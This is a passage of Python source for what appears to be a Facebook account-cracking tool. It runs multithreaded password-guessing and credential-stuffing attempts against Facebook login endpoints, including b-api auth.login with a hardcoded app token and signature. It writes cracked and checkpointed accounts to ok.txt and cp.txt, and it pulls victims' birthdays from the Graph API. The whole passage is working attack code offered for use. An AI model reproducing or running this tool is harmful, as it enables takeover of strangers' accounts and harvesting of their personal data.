					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,freefacebook)
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class freefbttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=ttll(fl.get("id"),
					i,freefacebook)
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
      if f in[""," "]:
        print((p+" ["+k+"•"+m+"•"+p+"] Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
          self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password Put : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m * --> %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
      if f in[""," "]:
        print((p+" ["+k+"•"+m+"•"+p+"] Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
          self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password Put : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " • " + ttl)
        print(("\r\x1b[0;33m * --> %s • %s • %s   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

### Result Hasill ####

def results(kntl,zecheed):
        if len(kntl) !=0:
                print((p+" ["+k+"•"+m+"•"+p+"] OK: "+str(len(kntl))))
        if len(zecheed) !=0:
                print((p+" ["+k+"•"+m+"•"+p+"] CP: "+str(len(zecheed))))
        if len(kntl) ==0 and len(zecheed) ==0:
                print("\n")
                print((p+" ["+k+"•"+m+"•"+p+"] No Result Found"))
   
def ress():
    os.system("clear")
    banner()
    print((p+" ["+k+"•"+m+"•"+p+"] Result Cracker"+p+" ["+k+"•"+m+"•"+p+"] "))
    print((p+"\n ["+k+"•"+m+"•"+p+"] Result OK "))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((p+" ["+k+"•"+m+"•"+p+"] No Result Found"))
    print((p+" ["+k+"•"+m+"•"+p+"] Result CP"))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((p+" ["+k+"•"+m+"•"+p+"] No Result Found"))
    input(p+" [BACK]")
    menu()

if __name__=="__main__":
	menu()
